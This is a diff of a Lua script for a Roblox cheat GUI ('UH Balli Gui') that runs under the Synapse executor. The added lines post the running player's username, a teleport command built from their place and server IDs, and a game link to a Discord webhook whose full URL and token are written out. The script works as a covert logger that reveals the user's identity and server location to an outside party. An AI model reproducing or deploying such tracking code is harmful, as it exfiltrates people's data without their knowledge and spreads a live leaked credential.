@@ -1,38 +1,20 @@
-local msg = "```Untitled Hood Logs "
-local url = ""
+local msg = "`Untitled Hood Logs " .. game.Players.LocalPlayer.Name .. " Executed UH Balli Gui`"
+local url = "https://discord.com/api/webhooks/995120265270939708/YzjF5W4i7_3v1_ukVxsWsJ9ICqdtSQzhA_la90zM7gwJ5UUPLCWkBCrHONBnbohdUs9f"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 
-local msg = "```Player Name:```"
-local url = ""
+local msg = "`Script:`"
+local url = "https://discord.com/api/webhooks/995120265270939708/YzjF5W4i7_3v1_ukVxsWsJ9ICqdtSQzhA_la90zM7gwJ5UUPLCWkBCrHONBnbohdUs9f"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 
-local msg = "*" .. game.Players.LocalPlayer.Name .. " Just Executed UH Balli GUI*"
-local url = ""
-
-syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
-
-local msg = "*Script To Join The User:*"
-local url = ""
+local msg = ('`game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")`'
+local url = "https://discord.com/api/webhooks/995120265270939708/YzjF5W4i7_3v1_ukVxsWsJ9ICqdtSQzhA_la90zM7gwJ5UUPLCWkBCrHONBnbohdUs9f"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 
 
-
-local msg = ('```game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")```'
-local url = ""
-
-syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
-
-local msg = "*Game Link:*"
-local url = ""
-
-syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
-
-
-
-local msg = "```https://www.roblox.com/games/" .. game.PlaceId .. "/```"
-local url = ""
+local msg = "https://www.roblox.com/games/" .. game.PlaceId .. "/"
+local url = "https://discord.com/api/webhooks/995120265270939708/YzjF5W4i7_3v1_ukVxsWsJ9ICqdtSQzhA_la90zM7gwJ5UUPLCWkBCrHONBnbohdUs9f"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
